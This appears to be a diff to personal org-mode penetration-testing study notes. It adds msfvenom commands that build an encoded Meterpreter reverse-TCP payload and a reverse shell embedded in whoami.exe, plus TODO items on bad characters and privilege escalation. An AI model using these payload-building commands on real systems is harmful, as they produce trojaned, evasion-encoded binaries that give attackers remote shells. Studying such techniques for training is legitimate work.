@@ -3649,7 +3649,12 @@ cp /usr/share/windows-resources/binaries/whoami.exe ./poultry/ && cd ./poultry
 
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.0.4 LPORT=80 -e x86/shikata_ga_nai -i 7 -f --list
   ## -f --list list possible formats
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.0.4 LPORT=80 -e x86/shikata_ga_nai -i 7 -f raw > met.bin
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.13 LPORT=80 -e x86/shikata_ga_nai -i 200 -f raw > met.bin
+  ## raw + binary => shellter => obfuscatedBinary (broken)
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.13 LPORT=80 -x /usr/share/windows-resources/binaries/whoami.exe -k -e x86/shikata_ga_nai -i 200 -f exe > whoami.exe
+  // continue!
+  ## -k keep normal behavior
+  ## use -e
   ## -e encode
   ## -i iteration
   ## -f raw, output raw payload only
@@ -3669,6 +3674,11 @@ shellter
        - [[https://en.wikipedia.org/wiki/Ephemeral_port][wiki: Ephemeral port]]
        - IANA suggests 49152-65535 (2^15 + 2^14 to 2^16 -1)(windows) for dynamic or private ports
          
+         
+* msf payload internal
+** an example
+   + ref:
+     - [[https://spaceraccoon.dev/imposter-alert-extracting-and-reversing-metasploit-payloads-flare-on-2020][msf payload reversing]]
 
 * TODO list
   + AD, LDAP enum users
@@ -3693,6 +3703,9 @@ shellter
   + use msfvenom, use the different format.
   + (reflective dll injection)
   + list all privilege escalation techniques
+  + bad chars (how to infer)
+  + the msfvenom hex
+    - how to use
      
 ** boxes
    1. ensure 100% with msf.
